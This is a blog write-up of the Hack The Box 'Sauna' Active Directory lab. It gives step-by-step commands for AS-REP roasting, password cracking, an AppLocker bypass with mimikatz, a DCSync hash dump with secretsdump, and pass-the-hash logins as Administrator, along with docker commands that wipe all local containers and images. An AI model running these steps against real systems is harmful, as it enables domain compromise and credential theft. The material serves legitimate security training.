---
layout: post
title:  "Sauna Writeup - Hack The Box"
date:   2025-08-28
desc: ""
keywords: "HTB,OSCP,OSEP,eCPPTv3,Windows,Active Directory,LDAP,Kerbrute,AS-REP Roasting Attack,Cracking,WinPEAS,BloodHound,DCSync Attack,Secretsdump,PassTheHash Attack,Easy"
categories: [HTB]
tags: [HTB,OSCP,OSEP,eCPPTv3,Windows,Active Directory,LDAP,Kerbrute,AS-REP Roasting Attack,Cracking,WinPEAS,BloodHound,DCSync Attack,Secretsdump,PassTheHash Attack,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I continue with my learning strategy to improve my skills in the field of **Information Security**, for this I continue to strengthen my knowledge about the **Windows** service that I will surely find deployed in real business environments, the **Active Directory**. The **Sauna** machine has configured different vulnerabilities and misconfigurations that I loved to exploit to engage the whole lab, it has been rated as **Easy** by the community but it took me a lot of time, frustration and effort to finish it. The reward of practicing with these **[Hack The Box's](https://www.hackthebox.com){:target="_blank"}** labs is **immeasurable**, matched only by the **fun** I experience in the course of the **Engagement** of it. I'm going to spawn the box to start the writeup.

<br /><br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before starting the lab, I check with `ping` that I already have connectivity with the machine by sending a trace and that the machine receives it correctly. I also take advantage of the `whichSystem.py` tool, developed by the **[hack4u](https://hack4u.io/){:target="_blank"}** community, to measure with a high probability of certainty that the machine's Operating System is **Windows**. With all the checks done I start the **Reconnaissance** phase by listing the open ports with `nmap`, which are many since it is a **Windows** machine and also an **Active Directory**. With the `nmap` scripts I leak information about the services and their versions, which I will have to audit to find the attack vector that will allow me to engage the system. The web application accessible through the unsecured **HTTP** protocol always presents a very large attack surface, so I will disclose the technology stack behind it with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, to investigate possible vulnerabilities.

```bash
ping -c 2 10.10.10.175
whichSystem.py 10.10.10.175
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.175 -oG allPorts
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689 10.10.10.175 -oN targeted
cat targeted
# Microsoft IIS
# Kerberos
# Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0
# WinRM

whatweb http://10.10.10.175
# http://10.10.10.175/
```

<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I make a research of the **functionalities**, **source code**, **links** of the **web application** but I don't find much, except a list of possible user names that can help me in a possible brute force attack to find valid accounts of the domain, most of the forms are not implemented yet. With `crackmapexec` I leak information about the **SMB** protocol and the Operating System, where I find the domain name again and corroborate that the SMB protocol **is signed**, that is to say that it would **not be vulnerable** to an **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**. I'm going to try to leak information with `dig` taking advantage that the **DNS** protocol is enabled, but first I'm going to add the domain name to my **hosts** file so my machine can resolve to the **IP** correctly. I find the typical subdomain of **[Hack The Box's](https://www.hackthebox.com){:target="_blank"}** machines, I also perform a failed **[AXFR](https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/){:target="_blank"}** attack, for the moment I don't find any promising attack vector.

> **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**: This attack uses the **Responder** toolkit to capture **SMB** authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.

> **[SMB-Scanning](https://www.vectra.ai/modern-attack/attack-techniques/smb-scanning){:target="_blank"}**: With this technique, attackers take advantage of the **SMB protocol's** built-in trust in network users. The attacker uses scanning to identify available accounts to target, then intercepts and manipulates a valid authentication session. By capturing and relaying authentication traffic, the attacker **impersonates** the user to gain unauthorized access.

```bash
# http://10.10.10.175/

crackmapexec smb 10.10.10.175
nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 2 EGOTISTICAL-BANK.LOCAL

dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL
dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL ns
# sauna.EGOTISTICAL-BANK.LOCAL
dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL axfr
```

<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another protocol I can use to enumerate the system is **RPC**, but when I try to access with `rpcclient` without entering a password it denies me access, I'm not having much luck with the **SMB** protocol either because I cannot connect or list the shared resources using the `smbclient` or `smbmap` tools. If I add the new subdomain I found to my **hosts** configuration file and use the browser to inspect, I can't see any change in the application which is an indication that **Virtual Hosting** is not being implemented. Since I'm in an **Active Directory** I'm dealing with the **Kerberos** protocol and I have the `kerbrute` tool, a project by **[ropnop](https://github.com/ropnop/kerbrute){:target="_blank"}**, available on **Github**, which I download on my machine to validate **DC** accounts. I create a custom dictionary using the team's names I found on the web and succed to find a valid account, plus its **AS-REP hash** that is impossible for me to crack with `john`.

> **[kerbrute](https://github.com/ropnop/kerbrute){:target="_blank"}**: This tool is designed to assist in quickly bruteforcing valid **Active Directory** accounts through **Kerberos Pre-Authentication**. It is designed to be used on an internal Windows domain with access to one of the **Domain Controllers**. <span style="color: red;">Warning:</span> failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts.

```bash
rpcclient -U "" 10.10.10.175 -N
  enumdomusers
  enumdomgroups
smbclient -L 10.10.10.175 -N
smbmap -H 10.10.10.175 -u 'null' --no-banner

nvim /etc/hosts
cat /etc/hosts | tail -n 1
# http://sauna.egotistical-bank.local/

kerbrute --help
# userenum      Enumerate valid domain usernames via Kerberos

nvim Usernames.txt
cat !$
kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local Usernames.txt

john -w=$(locate rockyou.txt)
john -w=/usr/share/wordlists/rockyou.txt kerberos_hash
```

<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have a valid account I will use the `impacket-GetNPUsers` tool to perform an **[AS-REP Roasting Attack](https://www.picussecurity.com/resource/blog/as-rep-roasting-attack-explained-mitre-attack-t1558.004){:target="_blank"}** using the custom dictionary (<ins>although I already know which account is valid</ins>) and I succeed in obtaining a new **ASREP hash** of the **FSmith** account that this time I can crack with `john`, using the **rockyou.txt** dictionary. I check with `crackmapexec` that the credential is valid, but also the same tool informs me that I can use the same credentials to access the machine through the **WinRM** protocol. I only have to resort to `evil-winrm` to gain access to the remote system and start the **Enumeration** phase, now begins my research for **special privileges**, **leakage of sensitive system information** or even access to the first flag.

> **[Impacket’s GetNPUsers.py](https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/){:target="_blank"}** will attempt to harvest the **non-preauth AS_REP responses** for a given list of usernames. These responses will be encrypted with the user’s password, which can then be cracked offline.

> **Attacker Machine**:

```bash
impacket-GetNPUsers egotistical-bank.local/ -dc-ip 10.10.10.175 -usersfile Usernames.txt -no-pass
nvim kerberos_hash
cat !$
john -w=/usr/share/wordlists/rockyou.txt kerberos_hash
john --show kerberos_hash

crackmapexec smb 10.10.10.175 -u 'FSmith' -p 'T...3'
crackmapexec winrm 10.10.10.175 -u 'FSmith' -p 'T...3'
evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'T...3'
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
whoami /priv
whoami /all
systeminfo
# Access is denied   :(
```

<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue looking for relevant information in the system that allows me to **Escalate Privileges**, I find all the enabled accounts of the domain but not much more. I'm going to automate the search for attack vectors with **[WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS){:target="_blank"}** to speed up this complex task, so by just transferring the `winPEASany.exe` binary to the victim machine and running it, I find the leak of a password corresponding to the **svc_loanmanager** account because the **AutoLogon** feature is enabled. Again I validate the credentials with `crackmapexec`, I can connect without problems again with `evil-winrm` after correcting the account name (**svc_loanmanager**) to the correct one (**svc_loanmgr**). I perform an enumeration of the system with the new engaged account but find nothing interesting.

> **[WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS){:target="_blank"}** is a script that search for possible paths to **escalate privileges** on **Windows** hosts.

> **Victime Machine**:

```cmd
net user

upload winPEASany.exe
.\winPEASany.exe
# Looking for AutoLogon credentials
```

> **Attacker Machine**:

```bash
crackmapexec smb 10.10.10.175 -u 'svc_loanmanager' -p 'M...d!'

crackmapexec smb 10.10.10.175 -u 'svc_loanmgr' -p 'M...d!'
crackmapexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'M...d!'
evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'M...d!'
```

<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another tool that I use when I'm in front of an **Active Directory** is **BloodHound**, which has an ingestor system that allows the **gathering**, **collection** and **import** of information from the **AD** to later find attack vectors. For this machine I'm going to use `bloodhound-python` as an ingestor that performs its task remotely, using the credentials of the last compromised account. The next thing is to **[install BloodHound on my machine](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart){:target="_blank"}**, I just have to download the compressed file that has an executable in charge of deploying all the necessary containers I need to make use of this tool. Previously I did a cleanup of my unnecessary local containers, then run `bloodhound-cli` that deploys the containers, I must pay attention to the installation logs because there is the access password. Once everything is installed **BloodHound** I can access it from the browser, and after updating the default password I can start my research.

```bash
bloodhound-python --help
# Python based ingestor for BloodHound LEGACY
# -c, --collectionmethod COLLECTIONMETHOD
# -d, --domain DOMAIN   Domain to query.
# -ns, --nameserver NAMESERVER

bloodhound-python -c all -u 'svc_loanmgr' -p 'M...d!' -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175

wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz --no-check-certificate

docker rm $(docker ps -a -q) --force
docker rmi $(docker images -q)
docker volume rm $(docker volume ls -q)
docker network rm $(docker network ls -q)

sudo ./bloodhound-cli install
# http://127.0.0.1:8080/ui/login
```

<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can now upload all the information collected in **.json** files with `bloodhount-python`, so **BloodHound** can take care of the data processing. My first task is to mark all the accounts I succeeded in taking ownership of (**SVC_LOANMGR** and **FSMITH**), the next thing I do is to investigate which are all the accounts that belong to the **Admins** group (I can only find the **Administrator** one).

```html
# http://127.0.0.1:8080/ui/administration/file-ingest
# Search: SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL            [Add to Owned]
# Search: FSMITH@EGOTISTICAL-BANK.LOCAL                 [Add to Owned]
# All Domain Admins
```

<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue my research with **BloodHound**, but I don't find much information relevant to the groups to which the accounts I managed to engage belong. Something I had overlooked is the **Outbound Object Control** that the **SVC_LOANMGR** account has, but more interestingly, I have the **Replicating Directory Changes** (**DS-Replication-Get-Changes**) and **Replicating Directory Changes All** (**DS-Replication-Get-Changes-All**) security permissions **enabled**, which would allow me to exploit a **[DCSync Attack](https://docs.tenable.com/identity-exposure/SaaS/Content/User/AttackPath/DCSync.htm){:target="_blank"}** with `mimikatz.exe` or even `impacket-secretsdump`. I just need to transfer `mimikatz.exe` to the victim machine, but I will perform an **[AppLocker Bypass](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md){:target="_blank"}** and save it in a special folder to avoid problems in its execution. Now I can perform the **[DCSync Attack](https://docs.tenable.com/identity-exposure/SaaS/Content/User/AttackPath/DCSync.htm){:target="_blank"}** and I manage to get the **NTLM Hash** of the **Administrator** account.

> **[AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/what-is-applocker){:target="_blank"}** helps you create rules to allow or **deny apps** from running based on information about the apps' files. You can also use **AppLocker** to **control which users or groups can run those apps**.

> **Attacker Machine**:

```bash
# MemberOf Domain Users
# Outbound Object Control (EGOTISTICAL-BANK.LOCAL: Domain) --> GetChangesAll && GetChanges (Togheter!)
# Windows && Linux Abuse

locate mimikatz.exe | grep -v al3j0
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
```

> **Victime Machine**:

```cmd
cd C:\Windows\System32\spool\drivers\color
upload mimikatz.exe
.\mimikatz.exe "lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator"
```

<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another approach to perform the **DCSync Attack** is with `impacket-secretsdump` or `secretsdump.py`, and with both tools I succeed to dump the **NTLM hash** of all the domain accounts. I can now perform a **[Pass-The-Hash Attack](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/){:target="_blank"}** with `evil-winrm` and finish engaging the machine **Sauna** to access the last flag.

> **[Pass the hash (PtH)](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/){:target="_blank"}** is a type of cybersecurity attack in which an adversary steals a “hashed” user credential and uses it to create a new user session on the same network. Unlike other credential theft attacks, a **pass the hash attack** does not require the attacker to know or crack the password to gain access to the system. Rather, it uses a stored version of the password to initiate a new session.

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175

secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175

evil-winrm -i 10.10.10.175 -u 'Administrator' -H '82...8e'

cleanDocker
```

<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another brutal **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, excellent for its configuration and the combination of vulnerabilities that I had to exploit with different techniques and tools. It does not present much complexity for experienced professionals, but for me it is a huge satisfaction every time I achieve the goal of **engaging** this kind of labs. I'm going to take advantage of the momentum that this box gave me to look for my next challenge, but first I must kill the **Sauna** box from my account.

<br /><br />
<img src="{{ site.img_path }}/sauna_writeup/Sauna_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
